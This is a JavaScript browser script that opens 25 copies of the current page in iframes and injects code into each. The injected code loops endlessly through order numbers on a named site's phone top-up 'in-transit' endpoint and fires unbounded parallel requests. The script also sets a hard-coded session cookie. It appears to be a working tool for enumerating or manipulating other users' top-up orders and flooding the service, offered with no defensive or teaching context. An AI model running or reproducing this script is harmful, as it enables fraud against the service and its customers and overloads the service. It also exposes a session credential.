function addIframes(){
  const cantidad = 25;

  const container = document.createElement("div");
  container.style.display = "flex";
  container.style.flexWrap = "wrap";
  container.style.gap = "20px";
  container.style.justifyContent = "center";
  container.style.padding = "20px";
  document.body.appendChild(container);

  for (let i = 1; i <= cantidad; i++) {
    const iframe = document.createElement("iframe");
    iframe.id = 'iframe' + i;
    iframe.src = window.location.toString();
    iframe.width = "800";
    iframe.height = "600";
    iframe.style.border = "2px solid #333";
    iframe.style.borderRadius = "10px";
    iframe.style.boxShadow = "0 4px 10px rgba(0,0,0,0.3)";
    iframe.style.backgroundColor = "#fff";
    container.appendChild(iframe);

     iframe.addEventListener("load", () => {
      try {
          const script = iframe.contentDocument.createElement("script");
          script.textContent = `
          let baseUrl = 'https://www.revoolico.com/';
          let orderUrl = baseUrl + 'actions/topup-cubarecarga/in-transit-topup/';
          let url = window.location.toString();
          let numOrder = parseInt(url.split("/").pop());

          function getOrder(numOrder){
            $.ajax({
              url:  orderUrl + numOrder,
              method: 'GET',
              success: function(response){
                if (/Usuario tiene recargas en proceso/i.test(response)) {
                    
                } else if (/Status no permitido a la transaccion/i.test(response)) {
                 numOrder = numOrder + 2;
                }  
                getOrder(numOrder);
              }
            });
          }

          getOrder(numOrder);
        `;
        iframe.contentDocument.body.appendChild(script);
      } catch (e) {
        console.warn("No se pudo inyectar script en iframe", i, e);
      }
    });


  }
}

function init(){
   addIframes();
}

document.cookie = "wmsession=88655a59-0ef5-46f3-a234-95df259d0fa0-1764193055756";

init();
